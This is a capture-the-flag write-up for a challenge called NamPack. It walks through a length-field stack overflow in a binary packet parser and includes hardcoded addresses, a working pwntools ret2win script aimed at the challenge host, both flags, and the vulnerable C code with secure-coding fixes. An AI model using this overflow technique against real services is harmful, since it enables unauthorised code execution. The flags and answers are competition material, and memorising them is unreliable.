# NamPack

**Author:** John_x9  
**Difficulty:** Hard  
**Connect:** `nc 167.86.100.57:9006`

Campus telemetry intake: binary packets with a `NAMP` header. The shipping label (`len`) is trusted more than the crate (`stackbuf[48]`). Cap is 512, still enough to crush the return address. Type `2` prints a honeypot. Type `99` plus a smash lands on `give_flag`.

---

## Blind solve path

Raw `nc` typing will mostly fail. Script it.

### 1. Connect

```bash
nc 167.86.100.57 9006
```

```text
NamPack telemetry intake
send packet
```

No text menu. Binary packet expected.

### 2. Discover the protocol

Valid magic is ASCII **`NAMP`**. Layout from trial and error:

```text
magic[4] = b'NAMP'
typ      = uint16 little-endian
len      = uint16 little-endian
payload  = exactly `len` bytes
```

| Packet | What you should see |
|--------|---------------------|
| Wrong magic | `bad magic` |
| `typ=1`, small len, body `hi` | `pong:hi` |
| `typ=2`, any small body | banner + **fake flag** |
| `typ=99`, small body | `unknown type` then `done` |
| `len` huge (>512) | `too big` |
| `len` medium (e.g. 200) with junk | often crash / no `done` |

Conclusion: **`len` is trusted** more than the stack buffer that receives the copy.

### 3. Fake flag

Type `2` / info handler:

```text
nampack/0.1 john_x9 build
nustCTF{1nf0_h4ndl3r_1s_n0t_th3_pr1z3}
```

Trap. Use an unused type (e.g. `99`) so you smash RIP and return into `give_flag` instead of living inside the decoy handler.

### 4. Addresses: honest note

No PIE. No helpful function address is printed. You need `give_flag`. For this build: **`0x4012bb`**.

Ask organizers for the matching binary, or use that fixed address. RIP offset from the start of the overflowed stack buffer is **104** on this build. Against remote only, binary-search offsets near 88-120.

| Piece | Value |
|-------|-------|
| plain `ret` | `0x40101a` (stack alignment before `give_flag`) |
| `give_flag` | `0x4012bb` |
| padding to RIP | 104 bytes |

On this remote, jumping straight to `give_flag` often dies before the flag prints (stack alignment). Put a plain `ret` first, then `give_flag`.

### 5. Working remote script

```python
#!/usr/bin/env python3
from pwn import *

HOST = '167.86.100.57'
PORT = 9006
GIVE_FLAG = 0x4012bb
RET = 0x40101a
OFS = 104

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'packet')

body = b'A' * OFS + p64(RET) + p64(GIVE_FLAG)
hdr = b'NAMP' + p16(99) + p16(len(body))
io.send(hdr + body)
print(io.recvall(timeout=3).decode(errors='ignore'))
```

Same script: [`solves/06-nampack-solve.py`](solves/06-nampack-solve.py). A crash after the flag line is fine if the flag already printed.

---

## Real flag

```text
nustCTF{n4mp4ck_l3n_trudt_1ssue}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
char stackbuf[48];
char body[512];
/* ... */
if(h.len > sizeof body){ puts("too big"); return -1; }
r = read(0, body, h.len);
memcpy(stackbuf, body, h.len);   /* h.len up to 512 into 48-byte stackbuf */
```

The length check only guards `body[512]`, not `stackbuf[48]`. Attacker-controlled `len` becomes a classic length-confusion stack smash.

**Secure coding fixes:**

1. Cap the copy to the destination: `memcpy(stackbuf, body, MIN(h.len, sizeof stackbuf))`, or reject `h.len > sizeof stackbuf`.
2. Prefer parsing into a heap buffer sized exactly to a validated length, and never copy into a smaller automatic array.
3. Treat packet length fields as untrusted: validate against both max packet size and the actual receive return value.
4. Do not leave an easy `give_flag` symbol as a ret2win target in production; open secrets only through authenticated control paths.
